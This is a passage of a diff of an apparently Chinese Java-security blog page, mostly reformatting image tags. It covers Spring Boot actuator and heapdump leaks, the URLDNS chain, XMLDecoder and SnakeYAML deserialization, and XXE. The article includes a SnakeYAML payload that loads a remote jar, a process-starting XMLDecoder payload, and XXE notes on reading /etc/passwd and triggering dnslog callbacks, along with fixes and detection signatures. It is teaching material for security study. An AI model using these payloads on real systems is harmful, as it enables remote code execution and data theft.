 </span></span><span style="display:flex;"><span>management.endpoints.web.exposure.include=*
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_32.png" alt="|700"  /></p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_33.png" alt="|700"  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_32.png" alt="|700" /><figcaption>|700</figcaption></figure>
+
+
+</p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_33.png" alt="|700" /><figcaption>|700</figcaption></figure>
+
+
+</p>
 <p>泄露安全(heapdump)
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_34.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_34.png" alt="" /></figure>
+
+
+
 使用heapdump敏感信息查询工具提取敏感信息
 JDumpSpider
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_35.png" alt="|750"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_35.png" alt="|750" /><figcaption>|750</figcaption></figure>
+
+
+</p>
 <h1 id="一句话总结">一句话总结</h1>
 <p>遇到springboot框架从两个方面去寻找安全问题：
 1.泄露安全(是否泄露了内部路由及heapdump)
@@ -2240,7 +3155,12 @@ JDumpSpider
 </span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> hashCode;
 </span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></div><p>这里会先判断hashCode是否为-1，如果不为-1则直接返回hashCode，也就是说我们只要在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询。(hashCode默认值为-1)
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_1.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_1.png" alt="" /></figure>
+
+
+
 这里的hashCode是private修饰的，所以我们需要通过反射来修改其值</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
@@ -2252,7 +3172,12 @@ JDumpSpider
 </span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(url,123); <span style="color:#75715e">//调用map.put 此时将不会再触发dns查询</span>
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>此时输出url的hashCode为123，证明修改成功。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_2.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_2.png" alt="" /></figure>
+
+
+
 当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>URLDNS.<span style="color:#a6e22e">java</span>
 </span></span><span style="display:flex;"><span>
@@ -2453,7 +3378,12 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>ObjectInputStream.readObject,将对象给恢复,调用恢复对象的readObject方法,执行命令
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_1.png" alt="|600"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_1.png" alt="|600" /><figcaption>|600</figcaption></figure>
+
+
+</p>
 <h4 id="xmldecoder">XMLDecoder</h4>
 <p>也是一样的,只不过是换成了xmldecode.readObject</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容</span>
@@ -2489,7 +3419,12 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;void</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;start&#34;</span> <span style="color:#f92672">/&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/object&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/java&gt;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_2.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_2.png" alt="" /></figure>
+
+
+</p>
 <h4 id="snakeyaml">SnakeYaml</h4>
 <p>SnakeYAML 反序列化,
 SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
@@ -2507,7 +3442,12 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://192.168.10.7:8000/yaml-payload.jar&#34;</span>]
 </span></span><span style="display:flex;"><span>  ]]
 </span></span><span style="display:flex;"><span>]
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_3.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_3.png" alt="" /></figure>
+
+
+</p>
 <h3 id="安全代码">安全代码</h3>
 <h4 id="黑白名单">黑白名单</h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制</span>
@@ -2547,12 +3487,22 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 白盒发现（特征类接口函数）</p>
 <h3 id="白盒">白盒</h3>
 <p>看是否用到了这些库,以及上面那些函数吧
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_4.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_4.png" alt="" /></figure>
+
+
+</p>
 <h3 id="黑盒">黑盒</h3>
 <p>黑盒的话看流量,看特征码
 java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，</p>
 <p>burp插件
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_5.png" alt="|600"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96_image_5.png" alt="|600" /><figcaption>|600</figcaption></figure>
+
+
+</p>
 <p>需要配置一下ysoserial(一款java反序列化漏洞payload生成器)的路径</p>
 <h1 id="一句话总结">一句话总结</h1>
 <p>反序列化时会调用被反序列化对象的readObject方法,当这个方法被重写后,就会导致漏洞产生</p>
@@ -2645,8 +3595,18 @@ SYSTEM、PUBLIC是外部资源的申请</p>
 <p>（通用实体、参数实体）</p>
 <p>1)内部实体
 所谓内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_1.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_1.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt="" /></figure>
+
+
+
 使用&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被“test”替换。</p>
 <p>在XML内部声明DTD:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
@@ -2669,22 +3629,42 @@ SYSTEM、PUBLIC是外部资源的申请</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY entityName PUBLIC &#34;publicID&#34; &#34;fileName&#34;&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY example PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;html4-transitional.dtd&#34;&gt;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_3.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_3.png" alt="" /></figure>
+
+
+
 有些XML文档包含system标识符定义的“实体”，这些文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。
 假如 SYSTEM 后面的内容可以被攻击者控制，那么攻击者就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd）或者远程文件（http://www.baidu.com/abc.txt）。</p>
 <p>3）通用实体
 用”&amp;实体名“引用的实体，在DTD中定义，在XML文档中引用。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_4.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_4.png" alt="" /></figure>
+
+
+</p>
 <p>4）参数实体
 使用<code>% 实体名</code>（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用<code>%实体名;</code>引用
 只有在DTD文件中，参数实体的声明才能引用其他实体
 和通用实体一样，参数实体也可以外部引用
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_5.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_5.png" alt="" /></figure>
+
+
+</p>
 <h3 id="xxe">XXE</h3>
 <p>XXE（XML External Entity Injection，XML 外部实体注入）是一种安全漏洞，通常发生在解析 XML 数据时。攻击者通过在 XML 文档中注入外部实体来读取本地文件、发送数据到远程服务器，甚至执行其他恶意操作。
 XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全问题。</p>
 <p>XXE漏洞之所以名为外部实体漏洞，就是因为问题主要出自于外部资源的申请以及外部实体的引用这部分特性中。我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了。
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_6.png" alt="|500"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_6.png" alt="|500" /><figcaption>|500</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [  
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
@@ -2746,7 +3726,12 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt="" /></figure>
+
+
+
 修复方法就是上面代码中的,setFeature,禁用外部实体</p>
 <h3 id="saxparser">SAXParser</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
@@ -2767,8 +3752,18 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>会有报错信息,但是dnslog弹成功了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_7.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_8.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_7.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_8.png" alt="" /></figure>
+
+
+</p>
 <h3 id="saxreader">SAXReader</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * SAXReader 是一个用于读取和解析 XML 文档的类。它基于 SAX (Simple API for XML) 实现，
